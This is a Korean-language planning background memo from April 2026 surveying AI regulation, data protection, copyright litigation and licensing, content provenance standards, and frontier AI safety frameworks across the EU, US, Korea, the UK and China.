# 09. 규제 / 안전 / 윤리 / 저작권 백그라운드

> 작성 시점: 2026-04-26
> 담당 도메인: EU AI Act, US 연방·주(州) 규제, 한국 AI 기본법, 데이터 보호, AI 저작권 소송, C2PA 출처표시, Frontier Safety Framework, 딥페이크 / 미성년자 보호, AI 보안 위협 (OWASP / MCP), 수출 통제
> 본 문서는 "기획용 백그라운드"이며 아이디에이션 / 실행 권고를 포함하지 않는다.

---

## 0. 전체 그림 — 2026년 4월 현재 규제 지형

| 관할 | 핵심 법령 / 정책 | 시행 상태 (2026-04 기준) | 최대 제재 |
| ---- | --------------- | ------------------------ | -------- |
| EU 27개국 | Regulation (EU) 2024/1689 (AI Act) | 2024-08 발효 → 2025-02 금지조항 → 2025-08 GPAI → 2026-08 고위험 일반시행 (Digital Omnibus 지연 협상 중) | 35M EUR 또는 전 세계 매출의 7% |
| EU GPAI | General-Purpose AI Code of Practice (2025-07-10) | 2025-08-02 적용, 2026-08-02 집행 개시 | Article 99 기준 (15M EUR 또는 3%) |
| 미국 연방 | EO 14179 "Removing Barriers to American Leadership in AI" + AI Action Plan (2025-07) | Biden EO 14110 폐지, 규제 완화 | (연방 단일 AI 법령 부재) |
| 미국 캘리포니아 | SB 53 Transparency in Frontier AI Act (TFAIA) | 2025-09-29 서명 → 2026-01-01 시행 | 위반 1건당 USD 1M |
| 미국 콜로라도 | SB 24-205 Colorado AI Act (ADAI) | 2024-05-17 서명 → 2026-06-30 시행 (2026-02-01에서 연기) | 위반 1건당 USD 20,000 |
| 미국 텍사스 | HB 149 TRAIGA | 2025-06-22 서명 → 2026-01-01 시행 | 위반 1건당 USD 200,000 |
| 한국 | 인공지능 발전과 신뢰 기반 조성 등에 관한 기본법 (법률 제20676호) | 2024-12-26 통과 → 2026-01-22 시행 (계도기간 1년+) | 과태료 3천만 원 |
| 영국 | AI Security Institute (전 AISI, 2025-02 개명) | 자율 거버넌스 + 사전 평가 | (법정 제재권 없음) |
| 중국 | 생성형 AI 서비스 관리 잠정 조치 (2023) + AIGC 라벨링 강제 (2025-09) | 시행 중 + 2026-04 AI 만화·드라마 면허제 | 행정처분 + 서비스 중단 |

EU의 35M EUR / 7% 카테고리는 GDPR(20M / 4%)을 능가하는 EU 사상 최고 단계 행정과징금이다 ([Article 99: Penalties — EU AI Act](https://artificialintelligenceact.eu/article/99/)).

---

## 1. EU AI Act — 단계별 시행 일정과 위험 등급

### 1.1 발효 및 단계별 적용 캘린더

EU AI Act (Regulation (EU) 2024/1689)는 **2024년 8월 1일** Official Journal 공시 후 발효되었으며, 다음 단계로 적용된다 ([Implementation Timeline | artificialintelligenceact.eu](https://artificialintelligenceact.eu/implementation-timeline/), [AI Act Service Desk Timeline](https://ai-act-service-desk.ec.europa.eu/en/ai-act/timeline/timeline-implementation-eu-ai-act)).

| 시점 | 적용 조항 | 핵심 내용 |
| ---- | -------- | -------- |
| 2024-08-01 | 발효 | Regulation 효력 발생 |
| 2025-02-02 | Article 5 Prohibited Practices, Article 4 AI Literacy | 사회 신용평가, 감정 추론(직장·교육), 무차별 얼굴 DB 스크래핑, 잠재의식 조작 등 금지 |
| 2025-08-02 | Article 51-55 GPAI, Chapter VII Governance, Article 99-101 Penalties | 범용 AI 모델 제공자 의무 + AI Office, AI Board 등 거버넌스 구조 |
| 2026-08-02 | Article 6+ High-Risk AI, Article 50 Transparency | 고위험 AI 일반 시행 + 합성 콘텐츠 라벨링 |
| 2027-08-02 | Annex I Section A 제품 통합 고위험 AI | 의료기기·자동차 등 기존 제품안전 법제와 결합된 AI |

#### Digital Omnibus 지연 변수
- 2025-11-19 Commission이 발표한 **Digital Omnibus 제안**은 표준(harmonised standards) 마련 지연을 이유로 **고위험 AI 적용 시점을 표준 가용성에 연동**하는 안을 포함한다. 즉 2026-08-02 일정이 사실상 미뤄질 가능성이 있다 ([Implementation Timeline | artificialintelligenceact.eu](https://artificialintelligenceact.eu/implementation-timeline/)).
- 2026-04 현재 EU 의회·이사회 협상 진행 중. 기획 단계에서는 "원안대로 2026-08-02 시행될 가능성"과 "최대 12-18개월 지연" 두 시나리오를 병행 가정해야 한다.

### 1.2 4단계 위험 등급 (Risk-based Approach)

| 등급 | 정의 | 예시 | 의무 |
| ---- | ---- | ---- | ---- |
| **Unacceptable Risk** (Article 5) | EU 기본권 침해 위험이 명백한 시스템 | 사회적 점수 매기기, 무차별 얼굴 DB 스크래핑, 직장·교육에서의 감정 추론, 잠재의식적 조작, 취약계층 착취, 실시간 원격 생체식별(예외 한정) | **전면 금지** |
| **High Risk** (Article 6, Annex III) | 안전·기본권에 중대한 위험 | 채용, 학점·시험 평가, 신용평가, 의료기기 SW, 사법·이민 의사결정 보조, 핵심 인프라 운영 | 위험관리 시스템, 데이터 거버넌스, 기술문서, 로깅, 인적 감독, 정확성·견고성·사이버보안, CE 마킹, EU DB 등록 |
| **Limited Risk** (Article 50) | 사용자 인지가 필요한 시스템 | 챗봇, 감정인식, 생체분류, 합성 미디어 (deepfake) | **고지 + 라벨링** 의무 |
| **Minimal Risk** | 그 외 | 스팸 필터, 게임 AI | 자율 |

### 1.3 Article 5 금지 행위 (2025-02-02 이미 발효)

2025-02-04 Commission은 **Guidelines on Prohibited AI Practices** (비구속) 발표 ([Article 5: Prohibited AI Practices | artificialintelligenceact.eu](https://artificialintelligenceact.eu/article/5/), [Initial Prohibitions Under EU AI Act Take Effect — Quinn Emanuel](https://www.quinnemanuel.com/the-firm/publications/initial-prohibitions-under-eu-ai-act-take-effect/)).

- **(1)(a) 잠재의식 조작 / 의도적 기만 기법** — 사용자가 인지하지 못하는 방식으로 행동을 왜곡하여 중대한 해를 초래
- **(1)(b) 취약계층 착취** — 연령·장애·사회경제적 지위로 인한 취약성을 이용
- **(1)(c) 사회적 점수 매기기 (Social Scoring)** — 공공·민간 모두 금지. 단, 점수가 (i) 데이터가 수집된 맥락과 무관한 사회적 맥락에서 불리한 처우로 이어지거나 (ii) 행동 가중대비 부당·불비례 처우인 경우
- **(1)(d) 범죄 예측 (개인 단위)** — 프로파일링 기반 범죄 위험 평가
- **(1)(e) 무차별 얼굴 이미지 DB 스크래핑** — Clearview AI 류 비즈니스 모델
- **(1)(f) 직장·교육기관 내 감정인식** — 의료·안전 목적 제외
- **(1)(g) 민감정보 추론 목적 생체분류** — 인종·정치성향·종교·성적 지향 등
- **(1)(h) 공공장소 실시간 원격 생체식별 (RBI)** — 좁은 법집행 예외만 허용

### 1.4 벌금 구조 (Article 99)

| 위반 유형 | 상한 |
| -------- | ---- |
| Article 5 금지 행위 위반 | **35M EUR 또는 전 세계 매출의 7%** (높은 쪽) |
| Article 5 외 사업자·인증기관 의무 위반 | **15M EUR 또는 3%** |
| 인증기관·당국에 부정확/불완전/오도 정보 제공 | **7.5M EUR 또는 1%** |
| GPAI 제공자 의무 위반 (Article 101) | **15M EUR 또는 3%** |

SME 및 스타트업은 위 두 값 중 **낮은 쪽**이 상한이다 ([Article 99 — artificialintelligenceact.eu](https://artificialintelligenceact.eu/article/99/), [EU AI Act Fines — RegDossier](https://regdossier.eu/eu-ai-act-fines-explained/)).

### 1.5 적용 대상 (역외 적용)

- EU 시장에 AI 시스템·GPAI 모델을 출시(placing on the market) / 서비스 개시(putting into service)하는 모든 제공자, 소재국 무관.
- EU 내에서 AI 시스템을 사용하는 deployer.
- AI 시스템의 출력이 EU 내에서 사용되는 경우의 제3국 제공자/deployer (외국 사업자도 EU 사용자 영향 시 포함).

---

## 2. GPAI Code of Practice — Frontier Provider 의무

### 2.1 개요

Commission AI Office가 주도한 **General-Purpose AI Code of Practice (Final Version)** 는 **2025년 7월 10일** 공개되었고, **2025년 8월 2일** GPAI 의무 적용일과 함께 자율 준수 도구로 정식 활용되기 시작했다 ([code-of-practice.ai](https://code-of-practice.ai/), [Skadden — EU's GPAI Obligations Now in Force](https://www.skadden.com/insights/publications/2025/08/eus-general-purpose-ai-obligations)).

3개 챕터:
1. **Transparency** — 모델 카드, 학습데이터 개요, 안전·성능 정보 공개
2. **Copyright** — TDM opt-out 존중, 라이선스 정책, 분쟁 처리 절차
3. **Safety & Security** (Systemic Risk 모델 한정) — Frontier Safety Framework 발행, 사고 보고, 외부 평가

### 2.2 서명 현황 (2026-04 기준)

| 회사 | 서명 챕터 | 비고 |
| ---- | -------- | ---- |
| Anthropic | 전 챕터 | |
| OpenAI | 전 챕터 | |
| Google | 전 챕터 | |
| Microsoft | 전 챕터 | |
| Amazon | 전 챕터 | |
| IBM | 전 챕터 | |
| Mistral, Cohere 등 EU/스타트업 다수 | 전 챕터 | 26개사 사인 (2025-08-01 기준) |
| **xAI** | **Safety & Security만** | Transparency·Copyright 챕터 거부, "혁신 저해" 주장 |
| **Meta** | **미서명** | 자체 GPAI 의무 직접 준수 입장 |
| 중국 본사 사업자 (DeepSeek, Alibaba 등) | **미서명** | |

집행은 2025-08-02 효력 + **2026-08-02부터 본격 enforcement** (정보 요청, 모델 접근, 리콜 명령) 가능 ([Euronews — 26 tech companies sign EU AI code](https://www.euronews.com/next/2025/08/01/some-26-tech-companies-sign-up-to-eu-commissions-ai-code), [Wikipedia — General-Purpose AI Code of Practice](https://en.wikipedia.org/wiki/General-Purpose_AI_Code_of_Practice)).

### 2.3 Systemic Risk 임계값
- 학습 컴퓨트 ≥ 10^25 FLOPs 모델은 자동 systemic risk GPAI로 추정 (Article 51).
- Frontier Safety Framework 작성·발행, **사전 평가 및 사고 통지**, **사이버보안 강화** 의무.

---

## 3. 미국 AI 정책 — 연방 폐기 + 주(州) 분권화

### 3.1 Trump 행정명령

- **EO 14110 (Biden, 2023-10-30)** "Safe, Secure, and Trustworthy Development and Use of AI" — 2025-01-20 Trump의 "Initial Rescissions" EO로 **폐지**.
- **EO 14179 (2025-01-23)** "Removing Barriers to American Leadership in Artificial Intelligence" 서명. 핵심 지시:
  1. AI 개발에서 "이념적 편향·사회적 의제"를 제거할 것
  2. 글로벌 AI 우위 유지 위한 **AI Action Plan** 수립 (Science & Tech 보좌관, AI/Crypto Czar, 국가안보보좌관 주도)
  3. Biden EO와 충돌하는 정책 식별·수정·폐지
- **AI Action Plan** 2025-07 공개 ([CAIDP — AI Action Plan 2025](https://www.caidp.org/public-voice/ai-action-plan-ostp-2025/)).
- **EO (2025-12, "Eliminating State Law Obstruction of National AI Policy")** — 주(州) AI 규제가 연방 정책을 저해할 경우 무효화 검토 ([WhiteHouse 2025-12 EO](https://www.whitehouse.gov/presidential-actions/2025/12/eliminating-state-law-obstruction-of-national-artificial-intelligence-policy/)).

### 3.2 주(州) AI 입법 비교

| 주 | 법령 | 서명 | 시행 | 적용 대상 | 핵심 의무 | 제재 |
| -- | ---- | ---- | ---- | --------- | --------- | ---- |
| 캘리포니아 | **SB 53 (TFAIA)** | 2025-09-29 | 2026-01-01 | 연 매출 USD 500M 이상 frontier developer (대략 OpenAI, Anthropic, Google DeepMind, Meta, Microsoft 5-8개사) | Frontier AI Framework 공표, 안전 사고 보고, 내부 거버넌스, **whistleblower 보호** | 위반 1건당 USD 1M 민사 |
| 콜로라도 | **SB 24-205 (ADAI)** | 2024-05-17 | **2026-06-30** (2026-02-01에서 연기) | 고위험 AI의 developer / deployer | 위험관리 정책, 영향평가, 소비자 통지, 알고리즘 차별 방지 reasonable care | CCPA 위반 1건당 USD 20,000 |
| 텍사스 | **HB 149 TRAIGA** | 2025-06-22 | 2026-01-01 | 모든 AI 개발·배포자 | 행동 조작, 차별, 아동 음란물·딥페이크 생성, 헌법권 침해 금지 + 규제 sandbox 제공 + AI Advisory Council | 위반 1건당 USD 200,000, AG 단독 집행, 60일 cure period |

추가 주: 일리노이(채용 AI 규제), 뉴욕(채용 AI 감사 NYC Local Law 144), 버지니아(소비자 AI 법안 통과 후 거부권), 유타(생성형 AI 고지 의무) 등.

### 3.3 California SB 53 세부

- 정식 명칭: **Transparency in Frontier Artificial Intelligence Act**, 저자: Senator Scott Wiener (D-SF)
- "Catastrophic risk"를 "≥USD 1B 손해 또는 ≥50명 사상"으로 정의 (Carnegie 정리 기준)
- Mandatory: (i) 안전 프레임워크 공표, (ii) 주요 사고 신고, (iii) 모델 weights 보안, (iv) 내부고발자 보호
- 발효 후 12개월 이내 California Department of Technology가 가이던스 발행 ([Brookings — What is California's AI safety law](https://www.brookings.edu/articles/what-is-californias-ai-safety-law/), [FPF — California's SB 53 Frontier AI Law Explained](https://fpf.org/blog/californias-sb-53-the-first-frontier-ai-law-explained/)).

### 3.4 Colorado AI Act 핵심
- "Consequential decision" (고용, 주거, 신용, 의료, 보험, 교육, 법률 서비스, 정부서비스)에서의 high-risk AI가 대상
- Deployer는 **알고리즘 차별 방지 reasonable care 의무** + **연 1회 영향평가** + **소비자 사전 고지** + **AG 통지 (차별 발견 시 90일 이내)**
- Developer는 **시스템 카드, 데이터 셋 정보, 차별 위험 평가 보고서** 제공
- 2026-06-30 시행 연기는 **SB 25B-004** (2025-08-28 서명) 통해 단일 변경

---

## 4. 한국 AI 기본법 (2026-01-22 시행)

### 4.1 입법 개요
- 정식 명칭: **인공지능 발전과 신뢰 기반 조성 등에 관한 기본법** (법률 제20676호)
- 국회 통과: **2024-12-26**, 공포: 2025-01-21, 시행: **2026-01-22**
- EU AI Act에 이은 **세계에서 두 번째 종합 AI 법제**이며, 시행 시점 기준으로는 **세계 최초 전면 적용** 사례가 될 전망 ([나무위키 — 인공지능 기본법](https://namu.wiki/w/%EC%9D%B8%EA%B3%B5%EC%A7%80%EB%8A%A5%20%EB%B0%9C%EC%A0%84%EA%B3%BC%20%EC%8B%A0%EB%A2%B0%20%EA%B8%B0%EB%B0%98%20%EC%A1%B0%EC%84%B1%20%EB%93%B1%EC%97%90%20%EA%B4%80%ED%95%9C%20%EA%B8%B0%EB%B3%B8%EB%B2%95), [국가법령정보센터](https://www.law.go.kr/lsInfoP.do?lsiSeq=268543)).

### 4.2 핵심 개념

| 개념 | 정의 |
| ---- | ---- |
| **고영향 AI** | 사람의 생명·신체 안전, 기본권에 중대한 영향을 줄 우려가 있는 AI. 보건·의료, 채용·인사 평가, 금융 신용 판단, 에너지·교통 등 핵심 인프라, 수사·재판 지원 등 |
| **생성형 AI** | 텍스트·이미지·음성·영상 등을 생성하는 AI |
| **국가 AI 위원회** | 대통령 직속, AI 정책 총괄 |
| **AI 안전연구소** | KISA 산하, 모델 안전성 평가 |

### 4.3 사업자 의무

1. **투명성 (Article 31)** — 제품·서비스가 고영향 AI 또는 생성형 AI 기반임을 사전 고지
2. **안전성 확보 (Article 32)** — 위험관리방안, AI 설명 방안, 이용자 보호 방안, 사람의 관리·감독 체계 수립·게시
3. **고영향 AI 영향평가** — 시행령 위임
4. **국내 대리인 지정** — 매출·이용자 일정 기준 이상 해외사업자 대상
5. **대규모 AI 안전성 확보 조치 결과 제출** — 컴퓨트 기준 frontier 모델

### 4.4 시행령 (2025-11-12 입법예고) 주요 내용

과기정통부 입법예고 ([CODIT — 인공지능기본법 시행령](https://thecodit.com/blog/AI-act-enforcement-decree-kr), [정책브리핑 — AI기본법 시행령](https://www.korea.kr/news/policyNewsView.do?newsId=148954629), [법제처 입법예고](https://www.moleg.go.kr/lawinfo/makingInfo.mo?lawSeq=84360)):

- **고영향 AI 판단 기준** 구체화 (사용 영역, 기본권 영향 중대성, 빈도)
- **"AI로 생성된 결과물" 고지 의무** — 텍스트는 명시적 표시, 이미지·영상은 워터마크/메타데이터
- **국내 대리인 의무 발생 기준**: 직전 사업연도 매출 1조 원 이상 또는 국내 이용자 100만 명 이상 (안)
- **과태료**: 사전고지 미이행, 국내대리인 미지정, 시정명령 미이행 시 **3천만 원 이하**
- **계도기간**: 시행 후 **최소 1년 이상** 운영 (실질 enforcement는 2027 이후)
- 7종 고시·가이드라인 초안 동시 공개 (생성형 AI 표시방법, 고영향 AI 영향평가 방법론 등)

### 4.5 EU AI Act 대비
- 한국법은 **"발전 + 신뢰" 균형 모델**: EU의 risk tier-based 강제규제와 달리 진흥+규제 혼합
- 과태료 상한이 EU 대비 매우 낮음 (EU 35M EUR vs 한국 3,000만 원)
- 다만 시정명령 미이행 시 **영업 정지 등 행정처분** 가능, 실질 부담은 별개

---

## 5. 개인정보 / 데이터 보호 ↔ AI 교차점

### 5.1 GDPR ↔ AI 학습 데이터

- **EDPB Opinion 28/2024** (2024-12) — LLM 학습에 GDPR 적용 시 (i) 익명성 입증 책임, (ii) 적법 근거 (정당한 이익 vs 동의), (iii) 모델 자체가 personal data를 "포함"하는지 등 4개 핵심 질문 답변 ([Data Protection Report — EDPB Opinion](https://www.dataprotectionreport.com/2025/01/the-edpb-opinion-on-training-ai-models-using-personal-data-and-recent-garante-fine-lawful-deployment-of-llms/)).
- **CNIL Guidance (2025-06-17)** — Article 6(1)(f) 정당한 이익을 AI 학습의 적법 근거로 인정 가능, 단 (i) 정당한 이익 명시, (ii) 필요성 입증, (iii) 권리·자유 균형 테스트 + opt-out 제공 ([Skadden — CNIL Clarifies GDPR Basis for AI Training](https://www.skadden.com/insights/publications/2025/06/cnil-clarifies-gdpr-basis-for-ai-training)).

### 5.2 Italian Garante v OpenAI

- **2024-12-20**: 이탈리아 DPA Garante가 ChatGPT 학습용 개인정보 처리 적법근거 부재, 미성년자 연령확인 미흡, 2023-03 데이터 유출 미고지를 이유로 **15M EUR 과징금** 부과 ([Lewis Silkin](https://www.lewissilkin.com/en/insights/2025/01/14/openai-faces-15-million-fine-as-the-italian-garante-strikes-again-102jtqc), [Freevacy](https://www.freevacy.com/news/italian-dpa/italian-dpa-fines-openai-eur15m-for-ai-training-gdpr-violations/6041)).
- **2025-03-21**: 로마 법원 **결정 효력 정지**.
- **2026-03-18**: 로마 법원 **결정 무효화** ([Cross-Border Data Forum — One Fine, Zero Survivors](https://www.crossborderdataforum.org/generative-ai-and-gdpr-enforcement-in-europe-a-lot-of-noise-one-fine-zero-survivors/)).

### 5.3 한국 PIPA + 생성형 AI 가이드라인

- **개인정보보호위원회(PIPC) 생성형 AI 개발·활용 안내서** (2025-08-06 발표) — AI 라이프사이클을 ① 목적설정 ② 전략수립 ③ 학습·개발 ④ 적용·관리 4단계로 구분, 각 단계별 개인정보 보호 고려사항 ([PIPC 안내서 PDF](https://smartcity.go.kr/wp-content/uploads/2025/09/%EB%B3%84%EC%B2%A82-%EC%83%9D%EC%84%B1%ED%98%95-%EC%9D%B8%EA%B3%B5%EC%A7%80%EB%8A%A5AI-%EA%B0%9C%EB%B0%9C%C2%B7%ED%99%9C%EC%9A%A9%EC%9D%84-%EC%9C%84%ED%95%9C-%EA%B0%9C%EC%9D%B8%EC%A0%95%EB%B3%B4-%EC%B2%98%EB%A6%AC-%EC%95%88%EB%82%B4%EC%84%9C.pdf), [Baker McKenzie — PIPC Guidelines](https://connectontech.bakermckenzie.com/south-korea-sets-ai-standard-pipcs-guidelines-for-generative-ai-present-obligations-opportunity/)).
- **개인정보 영향평가 (PIA) AI 평가항목** (2025-09-05 시행) — 공공기관 AI 활용 시 학습·운영 단계별 별도 평가 ([뉴시스](https://www.newsis.com/view/NISX20250904_0003315239)).
- **가명정보 처리 확대** — AI 연구목적의 비식별화 적정성 심의위원회 법제화, 비정형(영상·음성) 데이터 가명처리 지원.

### 5.4 미국 주(州) 데이터 보호
- 캘리포니아 CCPA/CPRA — 자동화된 의사결정 기술(ADMT) 규제 규칙 별도 (2024-2025 진행)
- 14개 주 개별 종합 프라이버시 법 (콜로라도 CPA, 코네티컷 CTDPA, 버지니아 VCDPA, 유타 UCPA 등)

### 5.5 중국 PIPL + 알고리즘 등록제
- **개인정보보호법(PIPL, 2021)** + **데이터보안법(2021)** + **생성형 AI 서비스 관리 잠정 조치 (2023-08-15)** — 알고리즘 등록(Algorithm Filing), 안전성 평가, 사회주의 핵심가치 부합 의무
- **2025-09**: CAC AIGC 라벨링 의무 시행 (텍스트, 이미지, 영상 모두 표시 강제)
- **2026-04-01**: AI 만화·드라마 면허제 — 사전 심사 + 미등록 시 서비스 중단 ([이비즈타임즈](https://www.e-biztimes.com/news/418540))

---

## 6. AI 저작권 — 주요 소송과 라이선스 거래

### 6.1 진행 중·종결 소송 매트릭스

| 소송 | 원고 | 피고 | 제소 | 현황 (2026-04) |
| ---- | ---- | ---- | ---- | -------------- |
| **NYT v. OpenAI** | The New York Times | OpenAI, Microsoft | 2023-12 SDNY | Discovery 단계, 2026-01-05 Stein 판사가 OpenAI에 **2,000만 건 ChatGPT 로그 제출 명령** 확정 |
| **Bartz et al. v. Anthropic** | Andrea Bartz, Charles Graeber, Kirk Wallace Johnson 등 작가 | Anthropic | 2024 N.D. Cal. | **2025-08 USD 1.5B 합의** (미국 사상 최대 저작권 합의), 9월 예비승인. 약 50만 건 작품, 작품당 약 USD 3,000 |
| **Disney + Universal v. Midjourney** | Disney, NBCUniversal | Midjourney | 2025-06-11 C.D. Cal. | 110페이지 소장. Shrek, Homer Simpson, Darth Vader 등 무단 생성 적시. 2025-08 Midjourney 변형 fair use 항변 답변 |
| **Getty Images v. Stability AI (UK)** | Getty Images | Stability AI | 2023 (UK High Court) | **2025-11-04 판결** — secondary copyright 청구 기각 (모델이 학습데이터 자체를 저장하지 않음). trademark 일부 인용 |
| **Authors Guild, Sarah Silverman 등 v. Meta** | 작가단체 | Meta | 2023 N.D. Cal. | 2025 일부 청구 dismiss, fair use 인정 일부 |
| **Concord, UMG 등 v. Anthropic** | 음악 출판사 | Anthropic | 2023 (가사 인용) | 진행 중 |

### 6.2 주요 판결 포인트

- **Bartz v. Anthropic (2025-06, Alsup 판사)** — "합법 취득 도서를 학습에 사용하는 것은 fair use이나, **shadow library에서 다운로드한 piracy는 fair use 아님**" → 1.5B 합의 도화선 ([Copyright Alliance — Bartz Settlement](https://copyrightalliance.org/participating-bartz-v-anthropic-settlement/), [Authors Guild](https://authorsguild.org/advocacy/artificial-intelligence/what-authors-need-to-know-about-the-anthropic-settlement/), [Kluwer Copyright Blog](https://legalblogs.wolterskluwer.com/copyright-blog/the-bartz-v-anthropic-settlement-understanding-americas-largest-copyright-settlement/)).
- **Getty v. Stability AI (UK 2025-11-04)** — Stable Diffusion이 학습데이터를 모델에 저장하지 않으므로 직접 침해 입증 실패. 단 "전자 사본도 'article' 해당" 선례 확립 ([Latham & Watkins](https://www.lw.com/en/insights/getty-images-v-stability-ai-english-high-court-rejects-secondary-copyright-claim), [Bird & Bird](https://www.twobirds.com/en/insights/2025/uk/stability-ai-defeats-getty-images-copyright-claims-in-first-of-its-kind-dispute-before-the-high-cour)).
- **NYT v. OpenAI** — "regurgitation"(모델 재생) 핵심 쟁점. 2,000만 건 로그 제출이 확정되며 fair use 항변 약화 가능성 ([Bloomberg Law](https://news.bloomberglaw.com/ip-law/openai-must-turn-over-20-million-chatgpt-logs-judge-affirms), [NPR](https://www.npr.org/2025/03/26/nx-s1-5288157/new-york-times-openai-copyright-case-goes-forward)).

### 6.3 라이선스 딜 ($M/년 추정)

| 컨텐츠사 | 파트너 | 규모 / 조건 |
| -------- | ------ | ----------- |
| Reddit | Google | 약 USD 60M/년 (2024-02) |
| Reddit | OpenAI | 약 USD 70M/년 (2024-05) |
| Financial Times | OpenAI | USD 5-10M/년 (2024-04) |
| Axel Springer (Bild, Welt, Politico, Business Insider) | OpenAI | "수천만 EUR" 3년 (2023-12) |
| Le Monde, Prisa Media | OpenAI | 비공개 (2024-03), 기사 출처·로고 표시 의무 |
| AP | OpenAI | 비공개 (2023-07) |
| News Corp (WSJ, NY Post 등) | OpenAI | 5년 USD 250M 추정 (2024-05) |
| Reddit 누적 데이터 라이선스 매출 | (다수) | USD 203M (2-3년 계약 기준), 매출의 약 10% ([TechCrunch — Reddit $203M](https://techcrunch.com/2024/02/22/reddit-says-its-made-203m-so-far-licensing-its-data/), [CJR — Reddit Winning](https://www.cjr.org/analysis/reddit-winning-ai-licensing-deals-openai-google-gemini-answers-rsl.php)) |

### 6.4 한국 — AI 저작물 등록 거부 사례

- 한국저작권위원회는 **인간의 창작적 기여가 인정되지 않는 AI 생성물은 저작물로 등록 불가** 입장 유지.
- 2024년: **AI 생성 이미지 2장을 단순 합성·후보정한 산출물** 등록 거절. "기계적 산출에 가까워 인간의 사상·감정 표현으로 보기 어렵다."
- **인간 창작 저작물에 AI 스타일 변환 지시한 결과물** 역시 거절.
- 2025년: 문체부·한국저작권위원회 **「생성형 AI 활용 저작물의 저작권 등록 안내서」** 발간 — 인간 창작에 AI를 도구로 활용한 경우의 등록 절차·범위 명확화 ([저작권위원회 안내서](https://www.copyright.or.kr/information-materials/publication/research-report/view.do?brdctsno=54253), [디지털인사이트 정리](https://ditoday.com/gai-copyright/)).

---

## 7. 컨텐츠 출처 표시 — C2PA, Content Credentials, EU 라벨링

### 7.1 C2PA 표준

- **Coalition for Content Provenance and Authenticity (C2PA)** 창립: Adobe, Microsoft, Intel, BBC, Sony, Truepic 등. 이후 Amazon, Google, Meta 합류.
- **Spec 2.2** 2025-05-01 release ([C2PA Spec 2.2 PDF](https://spec.c2pa.org/specifications/specifications/2.2/specs/_attachments/C2PA_Specification.pdf)).
- 작동 방식:
  - **하드 바인딩**: 매니페스트(JSON-LD)를 콘텐츠 파일에 직접 임베드 + X.509 인증서로 서명
  - **소프트 바인딩**: 핑거프린트, 워터마크로 분리 매칭
- **2025**: C2PA Conformance Program 출범, **Pixel 10**이 최고 보안등급 인증 1호 기기 ([C2PA 2025 백서](https://c2pa.org/wp-content/uploads/sites/33/2025/10/content_credentials_wp_0925.pdf)).

### 7.2 Adobe Content Credentials

- 2024-2025 Adobe **GenStudio for Performance Marketing**, **Firefly Creative Production**, **Content Authenticity API** (Firefly Services) 통합 — 엔터프라이즈 자산에 자동 Content Credentials 부여 ([Adobe Blog](https://business.adobe.com/blog/content-authenticity-arrives-for-enterprises)).
- 채택 진영: Leica, Nikon, Sony 카메라 / Microsoft Designer / OpenAI DALL·E·Sora / Google Pixel 10 / Meta (제한적).

### 7.3 EU AI Act Article 50 (워터마크 의무)

- **합성 콘텐츠 제공자** — 출력물이 **machine-readable format**으로 마킹되어 인공 생성/조작임이 식별 가능해야 함
- **Deepfake deployer** — 인공 생성·조작임을 명확하고 식별 가능하게 공개 (예술·풍자·평론 예외)
- **공익 정보 텍스트 deployer** — AI 생성임을 공개 (편집검토·인간책임 예외)
- 시행: **2026-08-02**
- 미준수 벌금: **15M EUR 또는 3% 매출** ([Article 50 — artificialintelligenceact.eu](https://artificialintelligenceact.eu/article/50/), [EU Code of Practice on AI-generated content](https://digital-strategy.ec.europa.eu/en/policies/code-practice-ai-generated-content), [Jones Day — Draft Code on AI Labelling](https://www.jonesday.com/en/insights/2026/01/european-commission-publishes-draft-code-of-practice-on-ai-labelling-and-transparency)).
- 2026-01 Commission **Draft Code of Practice on AI-Generated Content Transparency** 공개 — 다층 접근(visible disclosure + invisible watermarking + metadata) 권고. C2PA를 명시하지는 않으나 사실상 표준 수렴.

### 7.4 미국 NSA / CISA 가이던스
- **2025-01-29 NSA·CISA·FBI·호주 ASD·영국 NCSC 등 8개 기관 합동** "Strengthening Multimedia Integrity in the Generative AI Era" — Content Credentials를 핵심 권고 기술로 채택 ([CSI Content Credentials PDF](https://media.defense.gov/2025/Jan/29/2003634788/-1/-1/0/CSI-CONTENT-CREDENTIALS.PDF)).

---

## 8. AI 안전 평가 / Frontier Safety Framework

### 8.1 정부 AI Safety Institute

| 기관 | 변화 | 역할 |
| ---- | ---- | ---- |
| **UK AISI → AI Security Institute** (2025-02-14 개명) | DSIT 산하, Frontier AI 평가 | OpenAI o1, Claude 3.5 Sonnet 등 30+ 모델 사전 평가 ([AISI](https://www.aisi.gov.uk/), [AISI 2025 Year in Review](https://www.aisi.gov.uk/blog/our-2025-year-in-review)) |
| **US AISI → Center for AI Standards and Innovation (CAISI)** (2025-06 개명) | NIST 산하, Trump 행정부에서 임무 변경 | 표준 + 혁신 중심으로 재편, 안전성 사전평가는 축소 |
| **EU AI Office** | DG CONNECT 내, 2024-06 출범 | GPAI 감독, Code of Practice 운영 |
| **한국 AI 안전연구소** | KISA·ETRI 협력, 2024-11 출범 | Frontier 모델 안전성 평가 |
| **싱가포르 AI Verify Foundation, 일본 AISI, 캐나다 AISI** | 2024-2025 출범 | 국제 AISI Network 참여 |

### 8.2 Anthropic Responsible Scaling Policy (RSP)

- **RSP v3.0** — 2026-02-24 발효 ([RSP v3.0 PDF](https://www-cdn.anthropic.com/e670587677525f28df69b59e5fb4c22cc5461a17.pdf), [Anthropic — RSP v3](https://www.anthropic.com/news/responsible-scaling-policy-v3)).
- AI Safety Levels (ASL):
  - **ASL-2**: 현 일반 모델 기준
  - **ASL-3**: CBRN(생화학·방사·핵) 무기 지식 도움 가능 / 자율적 모델 weights 도용 방지를 위한 보안. **Claude Opus 4 (2025-05) 적용** ([Activating ASL-3](https://www.anthropic.com/news/activating-asl3-protections), [Activating ASL-3 Report](https://www.anthropic.com/activating-asl3-report)).
  - **ASL-4**: 국가 수준 행위자에 의미 있는 uplift / 자율 AI R&D 가능 모델
  - **ASL-5**: 인간 능력 초월
- v3 추가: CBRN "moderately resourced state program" uplift 임계값 신설, AI R&D 임계값 2단계 분리 ("entry-level 자동화" / "scaling 가속화"), Risk Report 3-6개월 주기 공개 + 외부 검토 의무.

### 8.3 OpenAI Preparedness Framework v2

- **2025-04-15** v2 공개 (22 페이지) ([OpenAI — Updating Preparedness Framework](https://openai.com/index/updating-our-preparedness-framework/), [v2 PDF](https://cdn.openai.com/pdf/18a02b5d-6b67-4cec-ab64-68cdfbddebcd/preparedness-framework-v2.pdf)).
- **Tracked Categories**: ① Biological/Chemical, ② Cybersecurity, ③ AI Self-improvement
- **Research Categories** (potential tracking): Long-range Autonomy, Sandbagging, Autonomous Replication & Adaptation, Undermining Safeguards, Nuclear/Radiological
